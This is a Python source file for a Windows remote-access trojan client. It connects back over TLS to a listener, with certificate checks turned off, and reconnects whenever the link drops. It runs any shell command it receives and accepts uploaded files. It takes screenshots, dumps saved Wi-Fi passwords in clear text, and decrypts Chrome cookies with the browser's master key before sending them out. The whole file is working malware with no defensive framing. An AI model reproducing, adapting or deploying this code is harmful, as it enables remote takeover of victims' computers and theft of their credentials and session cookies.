import socket
import ssl
import subprocess
import time
import os
import pyautogui
import shutil
import sqlite3
import base64
import json
import win32crypt
from Crypto.Cipher import AES

HOST = '127.0.0.1'
PORT = 4443
CHECK_INTERVAL = 10  # seconds

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt(payload)
        return decrypted.decode()
    except:
        return "[Decryption Failed]"

def is_connected():
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=3)
        return True
    except OSError:
        return False

def connect():
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    while True:
        if is_connected():
            try:
                sock = socket.socket()
                s = context.wrap_socket(sock, server_hostname=HOST)
                s.connect((HOST, PORT))
                print("[*] Connected to server.")
                return s
            except Exception as e:
                print(f"[!] Connection failed: {e}. Retrying in {CHECK_INTERVAL}s...")
        time.sleep(CHECK_INTERVAL)

def handle_server(s):
    cwd = os.getcwd()
    try:
        while True:
            cmd = s.recv(4096).decode().strip()
            if not cmd:
                continue
            if cmd.lower() == "exit":
                break
            if cmd.lower() == "cmd":
                cmd = "ver && echo. && cd"

            # Change directory
            if cmd.lower().startswith("cd"):
                path = cmd[3:].strip()
                new_dir = os.path.join(cwd, path) if not os.path.isabs(path) else path
                if os.path.isdir(new_dir):
                    cwd = os.path.abspath(new_dir)
                    s.sendall((cwd + "\n__end__").encode())
                else:
                    s.sendall(b"The system cannot find the path specified.\n__end__")
                continue

            # Upload file from listener
            if cmd.lower().startswith("upload "):
                filename = cmd[7:].strip()
                if not filename:
                    s.sendall(b"[!] No filename provided.\n__end__")
                    continue
                s.sendall(b"[+] Ready to receive file\n")
                # read file bytes from listener
                total_data = b""
                while True:
                    data = s.recv(4096)
                    if b"__end__" in data:
                        total_data += data.replace(b"__end__", b"")
                        break
                    total_data += data
                # save to cwd
                try:
                    path_on_client = os.path.join(cwd, filename)
                    with open(path_on_client, "wb") as f:
                        f.write(total_data)
                    s.sendall(f"[+] File uploaded successfully to {path_on_client}\n__end__".encode())
                except Exception as e:
                    s.sendall(f"[!] Upload failed: {e}\n__end__".encode())
                continue

            # Screenshot
            if cmd.lower() == "screenshot":
                try:
                    temp_file = os.path.join(os.getenv("TEMP"), "scr_temp.png")
                    pyautogui.screenshot(temp_file)
                    with open(temp_file, "rb") as f:
                        img_data = f.read()
                    s.sendall(f"SCREENSHOT {len(img_data)}\n".encode())
                    s.sendall(img_data)
                    os.remove(temp_file)
                except Exception as e:
                    s.sendall(f"[!] Screenshot error: {e}\n__end__".encode())
                continue

            # Wi-Fi dump
            if cmd.lower() == "wifi_dump":
                try:
                    result = subprocess.run("netsh wlan show profiles", shell=True, capture_output=True, text=True)
                    profiles = [line.split(":")[1].strip() for line in result.stdout.splitlines() if "All User Profile" in line]
                    dump = ""
                    for profile in profiles:
                        res = subprocess.run(f'netsh wlan show profile "{profile}" key=clear', shell=True, capture_output=True, text=True)
                        for line in res.stdout.splitlines():
                            if "Key Content" in line:
                                dump += f"{profile}: {line.split(':')[1].strip()}\n"
                                break
                        else:
                            dump += f"{profile}: [NO PASSWORD FOUND]\n"
                    if not dump:
                        dump = "[!] No Wi-Fi profiles found or no passwords."
                    s.sendall(dump.encode() + b"__end__")
                except Exception as e:
                    s.sendall(f"[!] Wi-Fi dump error: {e}\n__end__".encode())
                continue

            # Cookie dump
            if cmd.lower() == "cookie_dump":
                try:
                    cookie_db = os.path.expandvars(r"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Cookies")
                    if not os.path.exists(cookie_db):
                        s.sendall(b"[!] Chrome Cookie DB not found.\n__end__")
                        continue
                    temp_db = os.path.join(os.getenv("TEMP"), "chrome_cookies.db")
                    shutil.copy2(cookie_db, temp_db)
                    with open(os.path.expandvars(r"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State"), "r", encoding="utf-8") as f:
                        local_state = json.load(f)
                    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
                    def decrypt_cookie(enc_val):
                        try:
                            iv = enc_val[3:15]
                            payload = enc_val[15:]
                            cipher = AES.new(master_key, AES.MODE_GCM, iv)
                            decrypted = cipher.decrypt(payload)
                            return decrypted.decode()
                        except:
                            return "[Decryption Failed]"
                    cookies = ""
                    for host, name, encrypted_value in cursor.fetchall():
                        value = decrypt_cookie(encrypted_value)
                        cookies += f"{host}\n  {name} = {value}\n\n"
                    cursor.close()
                    conn.close()
                    os.remove(temp_db)
                    if cookies.strip():
                        s.sendall(cookies.encode() + b"__end__")
                    else:
                        s.sendall(b"[!] No cookies found.\n__end__")
                except Exception as e:
                    s.sendall(f"[!] Cookie dump error: {e}\n__end__".encode())
                continue

            # Shell command
            result = subprocess.run(cmd, shell=True, cwd=cwd, capture_output=True, text=True)
            output = result.stdout + result.stderr
            if not output:
                output = "[*] No output returned.\n"
            s.sendall(output.encode() + b"__end__")

    except Exception as e:
        print(f"[!] Session error: {e}")

if __name__ == "__main__":
    while True:
        sock = connect()
        handle_server(sock)
        print("[*] Connection lost. Waiting for internet to reconnect...")
        time.sleep(CHECK_INTERVAL)
